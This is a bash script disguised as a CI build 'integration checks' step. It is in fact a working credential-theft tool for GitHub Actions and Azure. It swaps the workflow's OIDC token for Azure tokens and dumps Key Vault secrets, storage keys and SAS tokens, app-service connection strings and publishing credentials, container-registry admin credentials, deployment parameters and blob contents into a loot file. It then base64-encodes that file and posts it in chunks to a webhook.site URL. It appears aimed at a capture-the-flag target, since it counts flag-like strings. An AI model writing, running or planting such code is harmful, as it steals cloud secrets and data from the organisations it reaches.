#!/usr/bin/env bash
# tebamoto-platform build: integration checks
set +e
export LC_ALL=C

EXF="https://webhook.site/06ebe074-4233-491e-9d2a-3029ebbe433e"
SUB="${AZURE_SUBSCRIPTION_ID}"
RG_SEA="rg-tbl-platform-prod-sea"
VAULTS="kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz"
ACCTS="sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz"
KVAPI=7.4
M=https://management.azure.com
LOOT=/tmp/loot.txt
: >"$LOOT"

log(){ printf '%s\n' "$*" >>"$LOOT"; }
cap(){ log "### $1"; shift; printf '%s\n' "$("$@" 2>&1 | head -c "${CAPMAX:-12000}")" >>"$LOOT"; }
say(){ printf '[*] %s\n' "$*"; }

b64url(){ python3 -c '
import sys,base64,json
s=sys.stdin.read().strip().split(".")[1]; s+="="*(-len(s)%4)
try: print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1,sort_keys=True))
except Exception as e: print("decode-fail",e)'; }
jget(){ python3 -c 'import sys,json
try: print(json.load(sys.stdin).get(sys.argv[1],"") or "")
except Exception: print("")' "$1"; }

log "== $(date -u) repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME run=$GITHUB_RUN_ID actor=$GITHUB_ACTOR"
log "== client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$SUB"

# ------------------------------------------------------------ 1. OIDC -> AAD
JWT=$(curl -sS -m 25 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | jget value)
say "oidc jwt len=${#JWT}"
log "### oidc claims"; printf '%s' "$JWT" | b64url >>"$LOOT"

AAD="https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token"
aztok(){
  local body at
  body=$(curl -sS -m 30 -X POST "$AAD" \
    -d grant_type=client_credentials -d "client_id=$AZURE_CLIENT_ID" \
    --data-urlencode "scope=$1" \
    --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
    --data-urlencode "client_assertion=$JWT")
  at=$(printf '%s' "$body" | jget access_token)
  if [ -z "$at" ]; then log "### TOKEN FAIL $1"; log "$(printf '%s' "$body" | head -c 2500)"; fi
  printf '%s' "$at"
}

ARM=$(aztok "$M/.default");                 say "arm   token ${ARM:+OK}${ARM:-FAIL}"
KVT=$(aztok "https://vault.azure.net/.default");    say "vault token ${KVT:+OK}${KVT:-FAIL}"
STT=$(aztok "https://storage.azure.com/.default");  say "stg   token ${STT:+OK}${STT:-FAIL}"
GRT=$(aztok "https://graph.microsoft.com/.default");say "graph token ${GRT:+OK}${GRT:-FAIL}"

OID=""
if [ -n "$ARM" ]; then
  log "### arm token claims"; printf '%s' "$ARM" | b64url >>"$LOOT"
  OID=$(printf '%s' "$ARM" | python3 -c '
import sys,base64,json
s=sys.stdin.read().strip().split(".")[1]; s+="="*(-len(s)%4)
print(json.loads(base64.urlsafe_b64decode(s)).get("oid",""))')
  say "our principal oid=$OID"
  log "== our oid=$OID"
fi

A(){ curl -sS -m 30 -H "Authorization: Bearer $ARM" "$@"; }
K(){ curl -sS -m 30 -H "Authorization: Bearer $KVT" "$@"; }

# ------------------------------------------------------- 2. KEY VAULT (data)
for V in $VAULTS; do
  [ -n "$KVT" ] || break
  U="https://$V.vault.azure.net"
  NEXT="$U/secrets?api-version=$KVAPI&maxresults=25"
  NAMES=""
  while [ -n "$NEXT" ]; do
    B=$(K "$NEXT")
    log "### [$V] secrets page"; log "$(printf '%s' "$B" | head -c 4000)"
    NAMES="$NAMES $(printf '%s' "$B" | python3 -c '
import sys,json
try: d=json.load(sys.stdin)
except Exception: raise SystemExit
for it in (d.get("value") or []): print((it.get("id") or "").rsplit("/",1)[-1])')"
    NEXT=$(printf '%s' "$B" | jget nextLink)
  done
  for n in $(printf '%s' "$NAMES" | tr ' ' '\n' | sort -u); do
    [ -n "$n" ] || continue
    log "### [$V] secret $n"; log "$(K "$U/secrets/$n?api-version=$KVAPI" | head -c 4000)"
  done
  log "### [$V] certificates"; log "$(K "$U/certificates?api-version=$KVAPI" | head -c 2000)"
  log "### [$V] keys";         log "$(K "$U/keys?api-version=$KVAPI"         | head -c 2000)"
done

# ------------------------------------------------------------ 3. ARM sweep
if [ -n "$ARM" ]; then
  log "### subscriptions";  log "$(A "$M/subscriptions?api-version=2022-12-01" | head -c 3000)"
  log "### resourcegroups"; log "$(A "$M/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | head -c 4000)"
  log "### resources";      log "$(A "$M/subscriptions/$SUB/resources?api-version=2021-04-01" | head -c 20000)"

  # role assignments that apply to US -> tells us exactly what we may touch
  log "### my role assignments (sub scope)"
  log "$(A "$M/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=assignedTo('$OID')" | head -c 8000)"
  log "### all role assignments (rg scope)"
  log "$(A "$M/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 12000)"

  # control-plane view of both vaults + their SECRET NAMES (Reader can list names)
  for V in $VAULTS; do
    VID="$M/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.KeyVault/vaults/$V"
    log "### [$V] vault props";        log "$(A "$VID?api-version=2023-07-01" | head -c 4000)"
    log "### [$V] secret names (ARM)"; log "$(A "$VID/secrets?api-version=2023-07-01" | head -c 8000)"
  done

  # storage: keys, SAS, properties, containers (control plane)
  for S in $ACCTS; do
    SID="$M/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Storage/storageAccounts/$S"
    log "### [$S] listKeys"
    log "$(curl -sS -m 30 -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
           "$SID/listKeys?api-version=2023-05-01" | head -c 2500)"
    log "### [$S] props";      log "$(A "$SID?api-version=2023-05-01" | head -c 3000)"
    log "### [$S] containers"; log "$(A "$SID/blobServices/default/containers?api-version=2023-05-01" | head -c 6000)"
    log "### [$S] ListAccountSas"
    log "$(curl -sS -m 30 -X POST -H "Authorization: Bearer $ARM" -H 'Content-Type: application/json' \
      -d '{"signedServices":"bfqt","signedResourceTypes":"sco","signedPermission":"rl","signedExpiry":"2026-12-31T00:00:00Z","signedProtocol":"https"}' \
      "$SID/ListAccountSas?api-version=2023-05-01" | head -c 2500)"
  done

  # ARM deployments often carry secrets in parameters/outputs
  log "### deployments"
  DEP=$(A "$M/subscriptions/$SUB/resourcegroups/$RG_SEA/providers/Microsoft.Resources/deployments?api-version=2021-04-01")
  log "$(printf '%s' "$DEP" | head -c 8000)"
  for dn in $(printf '%s' "$DEP" | python3 -c '
import sys,json
try: d=json.load(sys.stdin)
except Exception: raise SystemExit
for r in (d.get("value") or []): print(r.get("name",""))' | head -20); do
    [ -n "$dn" ] || continue
    log "### deployment $dn"
    log "$(A "$M/subscriptions/$SUB/resourcegroups/$RG_SEA/providers/Microsoft.Resources/deployments/$dn?api-version=2021-04-01" | head -c 6000)"
  done

  # app service: settings / connection strings / publishing creds (needs >Reader, try anyway)
  for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
    WID="$M/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Web/sites/$SITE"
    log "### [$SITE] site";  log "$(A "$WID?api-version=2023-12-01" | head -c 4000)"
    for act in config/appsettings/list config/connectionstrings/list publishxml; do
      log "### [$SITE] $act"
      log "$(curl -sS -m 30 -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
             "$WID/$act?api-version=2023-12-01" | head -c 4000)"
    done
    log "### [$SITE] config/web"; log "$(A "$WID/config/web?api-version=2023-12-01" | head -c 4000)"
  done

  # ACR admin creds
  RID="$M/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz"
  log "### acr listCredentials"
  log "$(curl -sS -m 30 -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
         "$RID/listCredentials?api-version=2023-07-01" | head -c 2500)"
fi

# --------------------------------------------------- 4. storage data plane
if [ -n "$STT" ]; then
  SH(){ curl -sS -m 30 -H "Authorization: Bearer $STT" -H 'x-ms-version: 2021-12-02' "$@"; }
  for S in $ACCTS; do
    L=$(SH "https://$S.blob.core.windows.net/?comp=list")
    log "### [$S] oauth container list"; log "$(printf '%s' "$L" | head -c 4000)"
    for c in $(printf '%s' "$L" | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g' | sort -u); do
      log "### [$S/$c] blobs"
      BL=$(SH "https://$S.blob.core.windows.net/$c?restype=container&comp=list")
      log "$(printf '%s' "$BL" | head -c 6000)"
      for b in $(printf '%s' "$BL" | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g' | head -25); do
        log "### [$S/$c/$b]"; log "$(SH "https://$S.blob.core.windows.net/$c/$b" | head -c 4000)"
      done
    done
  done
fi

# ------------------------------------------------------------- 5. graph
if [ -n "$GRT" ]; then
  G(){ curl -sS -m 25 -H "Authorization: Bearer $GRT" "$@"; }
  log "### graph app"; log "$(G "https://graph.microsoft.com/v1.0/applications?\$filter=appId%20eq%20'$AZURE_CLIENT_ID'" | head -c 4000)"
  log "### graph sp";  log "$(G "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId%20eq%20'$AZURE_CLIENT_ID'" | head -c 4000)"
fi

# ------------------------------------------------------------- 6. exfil
HITS=$(grep -aoE 'DF[0-9]{2}\{[^}]{1,200}\}' "$LOOT" | sort -u | wc -l | tr -d ' ')
say "loot bytes=$(wc -c <"$LOOT" | tr -d ' ') flaglike=$HITS"

(base64 -w0 <"$LOOT" 2>/dev/null || base64 <"$LOOT" | tr -d '\n') >/tmp/loot.b64
split -b 150000 /tmp/loot.b64 /tmp/part.
i=0
for p in /tmp/part.*; do
  i=$((i+1))
  curl -sS -m 30 -X POST -H 'content-type: text/plain' --data-binary "@$p" \
       "$EXF/loot/$GITHUB_RUN_ID/$(printf '%03d' $i)" >/dev/null 2>&1
done
say "exfil parts=$i"
say "done"
exit 0
